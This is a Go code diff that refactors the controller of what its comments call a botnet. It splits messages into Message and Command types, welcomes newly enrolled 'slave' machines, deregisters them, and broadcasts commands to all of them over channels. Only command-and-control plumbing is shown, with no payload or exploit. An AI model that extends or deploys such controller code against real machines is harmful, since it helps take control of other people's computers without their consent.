@@ -12,7 +12,7 @@ import (
 type Master struct {
 	masterPrivKey  *rsa.PrivateKey
 	masterPubKey   string
-	receiveMsgChan chan *protocol.Event // Channel for receiving de-crypted messages requests
+	receiveMsgChan chan *protocol.Message // Channel for receiving de-crypted messages requests
 	slaves         map[string]*SlaveCtrl
 }
 
@@ -26,7 +26,7 @@ func NewMaster() (*Master, error) {
 	return &Master{
 		masterPrivKey:  priv,
 		masterPubKey:   string(pub),
-		receiveMsgChan: make(chan *protocol.Event),
+		receiveMsgChan: make(chan *protocol.Message),
 		slaves:         make(map[string]*SlaveCtrl),
 	}, nil
 }
@@ -48,32 +48,32 @@ func (m *Master) EnrolSlave(slave *SlaveCtrl) {
 	log.Printf("[%s] joined net", slave.id)
 	go slave.writer()
 	go slave.reader()
-	// send ack back to slave
-	slave.MsgChan <- &protocol.Event{Type: protocol.EventTypeAck}
+	// send welcome back to slave
+	slave.CommandChan <- &protocol.Command{Type: protocol.CommandTypeWelcome}
 }
 
 // DeregisterSlave deregisters a slave from a botnet
 func (m *Master) DeregisterSlave(slaveID string) {
 	if slave, ok := m.slaves[slaveID]; ok {
 		delete(m.slaves, slaveID)
-		close(slave.MsgChan)
+		close(slave.CommandChan)
 	}
 	log.Printf("[%s] left net", slaveID)
 }
 
-func (m *Master) handleMessage(eve *protocol.Event) {
+func (m *Master) handleMessage(msg *protocol.Message) {
 	//TODO: handle incoming messages from slaves
 	log.Println("received message from slave")
-	log.Println(eve)
+	log.Println(msg)
 }
 
-func (m *Master) broadcastMessage(event *protocol.Event) {
+func (m *Master) broadcastCommand(cmd *protocol.Command) {
 	log.Printf("[MASTER] broadcasting message to %d slaves\n", len(m.slaves))
 	for slaveID := range m.slaves {
 		select {
-		case m.slaves[slaveID].MsgChan <- event:
+		case m.slaves[slaveID].CommandChan <- cmd:
 		default:
-			close(m.slaves[slaveID].MsgChan)
+			close(m.slaves[slaveID].CommandChan)
 			delete(m.slaves, slaveID)
 			log.Printf("[%s] left net", slaveID)
 		}
